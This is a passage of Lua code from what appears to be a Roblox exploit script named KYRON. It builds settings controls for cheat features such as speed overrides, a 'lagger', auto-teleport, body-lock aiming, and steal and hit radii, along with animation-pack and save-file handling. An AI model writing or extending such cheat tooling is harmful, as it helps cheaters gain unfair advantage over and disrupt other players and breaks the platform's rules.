            end)

            if _G._KYRONApplyInvertUI then
              pcall(_G._KYRONApplyInvertUI)
            end
          end

          fn93()

          local function fn94(arg, layoutOrder)
            local v96 = Settings:FindFirstChild(arg)

            if v96 then
              v96.LayoutOrder = layoutOrder
            end
          end

          fn94("Section_Buttons Image", 10)
          fn94("ButtonsImagePicker", 11)
          fn94("Section_Background", 20)
          fn94("BackgroundPicker", 21)
          fn94("ColorThemePicker", 22)
          fn94("Background Color", 23)
          fn94("Steal Bar Match", 24)
          fn94("Section_Mobile Buttons", 30)
          fn94("Advanced Lagger Button", 31)
          fn94("Circle Buttons", 40)
          fn94("Hide Mob Buttons", 33)
          fn94("HideSpecificButtonsList", 34)
          fn94("Button Size %", 35)
          fn94("Move Buttons", 36)
          fn94("Reset Buttons", 37)
          fn94("Section_UI Scale", 40)
          fn94("UI Scale", 41)
          fn94("Steal Bar Size", 70)
          fn94("Section_Interface", 50)
          fn94("Intro Song", 15)
          fn94("Intro", 52)
          fn94("SAVE SETTINGS", 53)
          fn94("RESET ALL SETTINGS", 54)
        end

        local function fn90()
          local function fn91(arg, arg2)
            if not arg then
              return
            end

            for _, child in ipairs(arg:GetChildren()) do
              if child:IsA("Frame") and child.Name == arg2 then
                return child
              end
            end
          end

          local function fn92(arg, arg2, arg3, arg4)
            local v95 = fn91(arg, arg2)
            if not v95 then
              return
            end
            local valueBox = v95:FindFirstChild("ValueBox")

            if valueBox and valueBox:IsA("TextBox") then
              if arg4 ~= nil then
                valueBox.Text = tostring(arg4)
              end

              valueBox.FocusLost:Connect(function()
                local v96 = tonumber
                local str10 = valueBox.Text:gsub("%%", "")
                local v97 = v96(str10)

                if v97 then
                  pcall(arg3, v97)

                  if autoSaveSettings.auto then
                    pcall(saveKYRONSettings)
                  end
                else
                  valueBox.Text = tostring(valueBox.Text)
                end
              end)
            end
          end

          fn92(Speed, "Normal Speed", function(arg)
            movementSpeedSettings.NS = math.max(arg, 0)
          end, movementSpeedSettings.NS)

          fn92(Speed, "Carry Speed", function(arg)
            movementSpeedSettings.CS = math.max(arg, 0)
          end, movementSpeedSettings.CS)

          fn92(Speed, "Lagger Normal Speed", function(arg)
            movementSpeedSettings.LG_C = math.clamp(arg, 0, 65)
          end, movementSpeedSettings.LG_C)

          fn92(Speed, "Lagger Carry Speed", function(arg)
            movementSpeedSettings.LG_N = math.clamp(arg, 0, 200)
          end, movementSpeedSettings.LG_N)

          fn92(Movement, "Auto TP Height", function(arg)
            autoTeleportState.height = math.clamp(arg, 1, 2000)
          end, autoTeleportState.height)

          fn92(Movement, "Bodylock Radius", function(arg)
            _G._KYRONLookAtEnemyRadius = math.clamp(arg, 1, 210)
          end, _G._KYRONLookAtEnemyRadius)

          fn92(Speed, "Enemy Base Range", function(arg)
            _G._KYRONAutoCarryEnemyBaseRange = math.clamp(arg, 5, 150)
            if _G._KYRONAutoCarryEnemyBaseEnabled then
              pcall(_G._KYRONStopAutoCarryEnemyBase)
              pcall(_G._KYRONStartAutoCarryEnemyBase)
            end
          end, _G._KYRONAutoCarryEnemyBaseRange)

          fn92(Combat, "Radius", function(arg)
            normalStealSettings.StealRadius = math.clamp(arg, 1, 250)
          end, normalStealSettings.StealRadius)

          if _G._KYRONSetNormalPauseSelector then
            _G._KYRONSetNormalPauseSelector(normalStealSettings.NormalStealPausePercent, true)
          end

          fn92(Combat, "SEMI Range", function(arg)
            stealController.CFG.STEAL_RANGE = math.clamp(arg, 1, 100)
          end, stealController.CFG.STEAL_RANGE)

          fn82()

          fn92(Combat, "Auto Bat Speed", function(arg)
            combatSettings.aimSpd = math.clamp(arg, 1, 200)
          end, combatSettings.aimSpd)

          fn92(Combat, "TP Swing Delay", function(arg)
            _G._KYRONTpBatSwingDelay = math.clamp(arg, 0.001, 1)
          end, string.format("%.3f", _G._KYRONTpBatSwingDelay))

          fn92(Combat, "Hard Hit Range", function(arg)
            KYRONSetHardHitRange(arg)
          end, combatSettings.hardHitRange or 10)

          fn92(Combat, "Perfect Hit Range", function(arg)
            KYRONSetPerfectHitRange(arg)
          end, combatSettings.perfectHitRange or 175)

          fn92(Utility, "FOV Value", function(arg)
            visualSettings.fovVal = math.clamp(arg, 1, 120)

            if visualSettings.fov then
              pcall(fn40)
            end
          end, visualSettings.fovVal)

          if Settings then
            local saved = fn91(Settings, "Saved")

            if saved then
              local textButton2 = Instance.new("TextButton", saved)
              textButton2.BackgroundTransparency = 1
              textButton2.Text = ""
              textButton2.Size = UDim2.new(1, 0, 1, 0)
              textButton2.ZIndex = 200
              textButton2.AutoButtonColor = false
              local textLabel2 = saved:FindFirstChildOfClass("TextLabel")
              local textColor3 = textLabel2 and textLabel2.TextColor3 or Color3.new(1, 1, 1)

              textButton2.Activated:Connect(function()
                local text

                if not _G._KYRONSaveFiles.canSave then
                  text = "NO FILE API"
                elseif not (pcall(saveKYRONSettings, true) and flag26) then
                  text = "WRITE FAIL: " .. tostring(str9 or "?")
                else
                  local ok, result = pcall(_G._KYRONSaveFiles.read, _G._KYRONSaveFiles.config)

                  if not ok or not result or #result < 10 then
                    text = "VERIFY FAIL"
                  else
                    local ok2, result2 = pcall(function()
                      return HttpService:JSONDecode(result)
                    end)

                    if not ok2 or type(result2) ~= "table" then
                      text = "PARSE FAIL " .. tostring(#result) .. "B"
                    else
                      local tbl54 = {}

                      if type(result2.on) == "table" then
                        for k, v95 in pairs(result2.on) do
                          if v95 then
                            tbl54[#tbl54 + 1] = k
                          end
                        end
                      end

                      local n40 = 0

                      if type(result2.keys) == "table" then
                        for k in pairs(result2.keys) do
                          n40 += 1
                        end
                      end

                      text = string.format("SAVED %dB | ON=%d KEYS=%d", #result, #tbl54, n40)
                      print("[SAVE-VERIFY] " .. #result .. "B | ON=[" .. table.concat(tbl54, ",") .. "]")
                    end
                  end
                end

                if textLabel2 then
                  textLabel2.Text = text
                  textLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)

                  task.delay(3, function()
                    pcall(function()
                      textLabel2.Text = "SAVE"
                      textLabel2.TextColor3 = textColor3
                    end)
                  end)
                end
              end)
            end

            if not fn91(Settings, "Loaded on start") then
              fn91(Settings, "Auto Save")
            end
          end

          -- Save confirmation and keybind-reset UI.
          _G._KYRONShowSaveToast = function() end

          if Keybinds then
            local frame6 = Instance.new("Frame")
            frame6.Name = "ResetKeybinds"
            frame6.BackgroundColor3 = tbl37.row
            frame6.BackgroundTransparency = 0.3
            frame6.BorderSizePixel = 0
            frame6.Size = UDim2.new(1, -4, 0, 34)
            frame6.LayoutOrder = -100
            frame6.ZIndex = 3
            frame6.Parent = Keybinds
            fn56(frame6, 9)
            fn57(frame6, 1.25)
            local textLabel2 = Instance.new("TextLabel", frame6)
            textLabel2.BackgroundTransparency = 1
            textLabel2.Text = "RESET ALL KEYBINDS"
            textLabel2.TextColor3 = tbl37.text
            textLabel2.TextSize = 13
            textLabel2.Font = Enum.Font.GothamBlack
            textLabel2.Size = UDim2.new(1, 0, 1, 0)
            textLabel2.TextXAlignment = Enum.TextXAlignment.Center
            textLabel2.ZIndex = 4
            local textButton2 = Instance.new("TextButton", frame6)
            textButton2.BackgroundTransparency = 1
            textButton2.Text = ""
            textButton2.Size = UDim2.new(1, 0, 1, 0)
            textButton2.ZIndex = 200
            textButton2.AutoButtonColor = false

            textButton2.Activated:Connect(function()
              for _, child in ipairs(Keybinds:GetChildren()) do
                if child:IsA("Frame") and tbl51[child.Name] then
                  local v95 = fn86(child)

                  if v95 then
                    v95:SetAttribute("KeyCodeName", nil)
                    v95.Text = "?"
                  end
                end
              end

              for k in pairs(tbl52) do
                tbl52[k] = nil
              end

              _G._KYRONKbSave = {}

              if autoSaveSettings.auto then
                task.spawn(function()
                  pcall(saveKYRONSettings)
                end)
              end

              textLabel2.Text = "CLEARED ✓"

              task.delay(1, function()
                pcall(function()
                  textLabel2.Text = "RESET ALL KEYBINDS"
                end)
              end)
            end)
          end
        end

        fn90()
      end

      local function fn71()
        if Utility then
          Utility:FindFirstChild("Custom Sky")
        end

        local tbl45 = {
          ["Adidas Sports"] = {
            WalkAnim = 18537392113,
            RunAnim = 18537384940,
            JumpAnim = 18537380791,
            FallAnim = 18537367238,
            SwimIdle = 18537387180,
            Swim = 18537389531,
            Animation1 = 18537376492,
            Animation2 = 18537371272,
            ClimbAnim = 18537363391,
          },
          ["Adidas Community"] = {
            WalkAnim = 122150855457006,
            RunAnim = 82598234841035,
            JumpAnim = 75290611992385,
            FallAnim = 98600215928904,
            SwimIdle = 109346520324160,
            Swim = 133308483266208,
            Animation1 = 122257458498464,
            Animation2 = 102357151005774,
            ClimbAnim = 88763136693023,
          },
          ["Adidas Aura"] = {
            WalkAnim = 83842218823011,
            RunAnim = 118320322718866,
            JumpAnim = 109996626521204,
            FallAnim = 95603166884636,
            SwimIdle = 94922130551805,
            Swim = 134530128383903,
            Animation1 = 110211186840347,
            Animation2 = 114191137265065,
            ClimbAnim = 97824616490448,
          },
          ["Wicked Popular"] = {
            WalkAnim = 92072849924640,
            RunAnim = 72301599441680,
            JumpAnim = 104325245285198,
            FallAnim = 121152442762481,
            Animation1 = 118832222982049,
            ClimbAnim = 131326830509784,
            SwimIdle = 113199415118199,
            Swim = 99384245425157,
            Animation2 = 76049494037641,
          },
          Elder = {
            WalkAnim = 10921111375,
            RunAnim = 10921104374,
            JumpAnim = 10921107367,
            FallAnim = 10921105765,
            SwimIdle = 10921110146,
            Swim = 10921108971,
            ClimbAnim = 10921100400,
            Animation1 = 10921101664,
            Animation2 = 10921102574,
          },
          Zombie = {
            WalkAnim = 10921355261,
            RunAnim = 616163682,
            JumpAnim = 10921351278,
            FallAnim = 10921350320,
            SwimIdle = 10921353442,
            Swim = 10921352344,
            Animation1 = 10921344533,
            Animation2 = 10921345304,
            ClimbAnim = 10921343576,
          },
          Mage = {
            WalkAnim = 10921152678,
            RunAnim = 10921148209,
            JumpAnim = 10921149743,
            FallAnim = 10921148939,
            SwimIdle = 10921151661,
            Swim = 10921150788,
            ClimbAnim = 10921143404,
            Animation1 = 10921144709,
            Animation2 = 10921145797,
          },
          ["Catwalk Glam"] = {
            WalkAnim = 109168724482748,
            RunAnim = 81024476153754,
            JumpAnim = 116936326516985,
            FallAnim = 92294537340807,
            SwimIdle = 98854111361360,
            Swim = 134591743181628,
            ClimbAnim = 119377220967554,
            Animation1 = 133806214992291,
            Animation2 = 94970088341563,
          },
          Astronaut = {
            WalkAnim = 10921046031,
            RunAnim = 10921039308,
            JumpAnim = 10921042494,
            FallAnim = 10921040576,
            SwimIdle = 10921045006,
            Swim = 10921044000,
            ClimbAnim = 10921032124,
            Animation1 = 10921034824,
            Animation2 = 10921036806,
          },
          Werewolf = {
            WalkAnim = 10921342074,
            RunAnim = 10921336997,
            FallAnim = 10921337907,
            SwimIdle = 10921341319,
            Swim = 10921340419,
            ClimbAnim = 10921329322,
            Animation1 = 10921330408,
            Animation2 = 10921333667,
          },
          Superhero = {
            WalkAnim = 10921298616,
            RunAnim = 10921291831,
            JumpAnim = 10921294559,
            FallAnim = 10921293373,
            SwimIdle = 10921297391,
            Swim = 10921295495,
            ClimbAnim = 10921286911,
            Animation1 = 10921288909,
            Animation2 = 10921290167,
          },
          Toy = {
            WalkAnim = 10921312010,
            RunAnim = 10921306285,
            JumpAnim = 10921308158,
            FallAnim = 10921307241,
            SwimIdle = 10921310341,
            Swim = 10921309319,
            ClimbAnim = 10921300839,
            Animation1 = 10921301576,
          },
          ["No Boundaries"] = {
            WalkAnim = 18747074203,
            RunAnim = 18747070484,
            JumpAnim = 18747069148,
            FallAnim = 18747062535,
            SwimIdle = 18747071682,
            Swim = 18747073181,
            ClimbAnim = 18747060903,
            Animation1 = 18747067405,
            Animation2 = 18747063918,
          },
          NFL = {
            WalkAnim = 110358958299415,
            RunAnim = 117333533048078,
            JumpAnim = 119846112151352,
            FallAnim = 129773241321032,
            SwimIdle = 79090109939093,
            Swim = 132697394189921,
            ClimbAnim = 134630013742019,
            Animation1 = 92080889861410,
            Animation2 = 74451233229259,
          },
          ["Amazon Unboxed"] = {
            WalkAnim = 90478085024465,
            RunAnim = 134824450619865,
            JumpAnim = 121454505477205,
            FallAnim = 94788218468396,
            SwimIdle = 129126268464847,
            Swim = 105962919001086,
            ClimbAnim = 121145883950231,
            Animation1 = 98281136301627,
          },
          Vampire = {
            WalkAnim = 10921326949,
            RunAnim = 10921320299,
            JumpAnim = 10921322186,
            FallAnim = 10921321317,
            SwimIdle = 10921325443,
            Swim = 10921324408,
            ClimbAnim = 10921314188,
            Animation1 = 10921315373,
          },
          Ninja = {
            Run = 656118852,
            Walk = 656121766,
            Jump = 656117878,
            Fall = 656115606,
            Swim = 656119721,
            SwimIdle = 656121397,
            Climb = 656114359,
            Idle = { 656117400, 656118341, 886742569 },
          },
          Robot = {
            Run = 616091570,
            Walk = 616095330,
            Jump = 616090535,
            Fall = 616087089,
            Swim = 616092998,
            SwimIdle = 616094091,
            Climb = 616086039,
            Idle = { 616088211, 616089559, 885531463 },
          },
          Levitation = {
            Run = 616010382,
            Walk = 616013216,
            Jump = 616008936,
            Fall = 616005863,
            Swim = 616011509,
            SwimIdle = 616012453,
            Climb = 616003713,
            Idle = { 616006778, 616008087, 886862142 },
          },
          Stylish = {
            Run = 616140816,
            Walk = 616146177,
            Jump = 616139451,
            Fall = 616134815,
            Swim = 616143378,
            SwimIdle = 616144772,
            Climb = 616133594,
            Idle = { 616136790, 616138447, 886888594 },
          },
          Bubbly = {
            Run = 910025107,
            Walk = 910034870,
            Jump = 910016857,
            Fall = 910001910,
            Swim = 910028158,
            SwimIdle = 910030921,
            Climb = 909997997,
            Idle = { 910004836, 910009958, 1018536639 },
          },
          Cartoon = {
            Run = 742638842,
            Walk = 742640026,
            Jump = 742637942,
            Fall = 742637151,
            Swim = 742639220,
            SwimIdle = 742639812,
            Climb = 742636889,
            Idle = { 742637544, 742638445, 885477856 },
          },
        }

        local tbl46 = {
          "Off",
          "Adidas Sports",
          "Adidas Community",
          "Adidas Aura",
          "Wicked Popular",
          "Elder",
          "Zombie",
          "Mage",
          "Catwalk Glam",
          "Astronaut",
          "Werewolf",
          "Superhero",
          "Toy",
          "No Boundaries",
          "NFL",
          "Amazon Unboxed",
          "Vampire",
          "Ninja",
          "Robot",
          "Levitation",
          "Stylish",
          "Bubbly",
          "Cartoon",
        }

        local function fn72(arg, ...)
          local v93 = table.pack(...)

          for i = 1, select("#", ...) do
            local v94 = arg[select(i, table.unpack(v93, 1, v93.n))]
            if v94 ~= nil then
              return v94
            end
          end
        end

        local function KYRONApplyAnimPack(KYRONAnimPack)
          if KYRONAnimPack == "Off" or not tbl45[KYRONAnimPack] then
            local character = localPlayer.Character

            if character then
              local animate = character:FindFirstChild("Animate")

              if animate then
                animate.Disabled = true
                task.wait(0.06)
                animate.Disabled = false
              end
            end

            _G._KYRONAnimPack = "Off"
            return
          end

          local v93 = tbl45[KYRONAnimPack]
          local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
          local animate = nil

          for i = 1, 40 do
            animate = character:FindFirstChild("Animate")

            if not (animate and animate:FindFirstChild("run")) then
              task.wait(0.1)
              animate = nil
              continue
            end

            break
          end

          if not animate then
            return
          end

          local function fn73(arg, name, arg2)
            if not arg or not arg2 then
              return
            end
            local animation = arg:FindFirstChild(name)

            if not animation then
              animation = Instance.new("Animation", arg)
              animation.Name = name
            end

            animation.AnimationId = "rbxassetid://" .. tostring(arg2)
          end

          fn73(animate:FindFirstChild("walk"), "WalkAnim", fn72(v93, "WalkAnim", "Walk"))
          fn73(animate:FindFirstChild("run"), "RunAnim", fn72(v93, "RunAnim", "Run"))
          fn73(animate:FindFirstChild("jump"), "JumpAnim", fn72(v93, "JumpAnim", "Jump"))
          fn73(animate:FindFirstChild("fall"), "FallAnim", fn72(v93, "FallAnim", "Fall"))
          fn73(animate:FindFirstChild("climb"), "ClimbAnim", fn72(v93, "ClimbAnim", "Climb"))
          fn73(animate:FindFirstChild("swim"), "Swim", fn72(v93, "Swim"))
          fn73(animate:FindFirstChild("swimidle"), "SwimIdle", fn72(v93, "SwimIdle", "Swim"))
          local idle = animate:FindFirstChild("idle")

          if idle then
            local animation1 = fn72(v93, "Animation1")
            local animation2 = fn72(v93, "Animation2")

            if animation1 or animation2 then
              fn73(idle, "Animation1", animation1 or animation2)
              fn73(idle, "Animation2", animation2 or animation1)
            elseif v93.Idle then
              fn73(idle, "Animation1", v93.Idle[1])
              fn73(idle, "Animation2", v93.Idle[2] or v93.Idle[1])
            end
          end

          animate.Disabled = true
          task.wait(0.06)
          animate.Disabled = false
          local humanoid = character:FindFirstChildOfClass("Humanoid")

          if humanoid then
            pcall(function()
              humanoid:ChangeState(Enum.HumanoidStateType.Landed)
              task.wait(0.03)
              humanoid:ChangeState(Enum.HumanoidStateType.Running)
            end)
          end

          _G._KYRONAnimPack = KYRONAnimPack
        end

        -- Animation-pack setup and character-respawn hooks.
        _G._KYRONApplyAnimPack = KYRONApplyAnimPack
        _G._KYRONAnimPack = _G._KYRONAnimPack or "Amazon Unboxed"

        if _G._KYRONAnimPack ~= "Off" then
          task.defer(KYRONApplyAnimPack, _G._KYRONAnimPack)
        end

        localPlayer.CharacterAdded:Connect(function()
          task.wait(0.6)

          if _G._KYRONAnimPack and _G._KYRONAnimPack ~= "Off" then
            KYRONApplyAnimPack(_G._KYRONAnimPack)
          end
        end)

        local animPack = Utility and Utility:FindFirstChild("Anim Pack")

        if animPack then
          local animPackPrev = animPack:FindFirstChild("AnimPackPrev", true)
          local animPackNext = animPack:FindFirstChild("AnimPackNext", true)
          local animPackValue = animPack:FindFirstChild("AnimPackValue", true)
          local n35 = 1

          local function fn73()
            local v93 = tbl46[n35]

            if animPackValue then
              animPackValue.Text = string.upper(v93)
            end

            KYRONApplyAnimPack(v93)

            if autoSaveSettings.auto then
              task.spawn(function()
                pcall(saveKYRONSettings)
              end)
            end
          end

          if _G._KYRONAnimPack then
            for i, v93 in ipairs(tbl46) do
              if v93 == _G._KYRONAnimPack then
                n35 = i
                break
              end
            end

            if animPackValue then
              animPackValue.Text = string.upper(tbl46[n35])
            end
          end

          if animPackPrev then
            animPackPrev.Activated:Connect(function()
              n35 = (n35 - 2) % #tbl46 + 1
              fn73()
            end)
          end

          if animPackNext then
            animPackNext.Activated:Connect(function()
              n35 = n35 % #tbl46 + 1
              fn73()
            end)
          end
        end
      end

      fn71()

      task.spawn(function()
        while task.wait(2) do
          local currentCamera = workspace.CurrentCamera

          if currentCamera and screenGui and screenGui.Parent then
            local viewportSize = currentCamera.ViewportSize
            local visible = frame2 and frame2.Visible
            local visible2 = frame3 and frame3.Visible

            local function fn72(arg)
              if not arg then
                return false
              end
              local absolutePosition = arg.AbsolutePosition
              local absoluteSize = arg.AbsoluteSize
              return absolutePosition.X > -absoluteSize.X * 0.5
                and absolutePosition.Y > -absoluteSize.Y * 0.5
                and absolutePosition.X < viewportSize.X - absoluteSize.X * 0.5
                and absolutePosition.Y < viewportSize.Y - absoluteSize.Y * 0.5
            end

            if not (visible and fn72(frame2) or visible2 and fn72(frame3)) then
              if frame2 then
                frame2.Position = UDim2.new(0, 24, 0.5, 0)
                position = frame2.Position
                frame2.Visible = true
              end

              if frame3 then
                frame3.Position = UDim2.new(0, 14, 0.4, 0)
                frame3.Visible = false
              end

              _G._KYRONMainPos = nil
              _G._KYRONFloatBtnPos = nil
            end
          end
        end
      end)
    end

    fn55()
  end
end

local success, err = pcall(_KYRONMain)
if not success then
  local msg = "KYRON CRITICAL ERROR: " .. tostring(err)
  warn(msg)
  pcall(setclipboard, msg)
end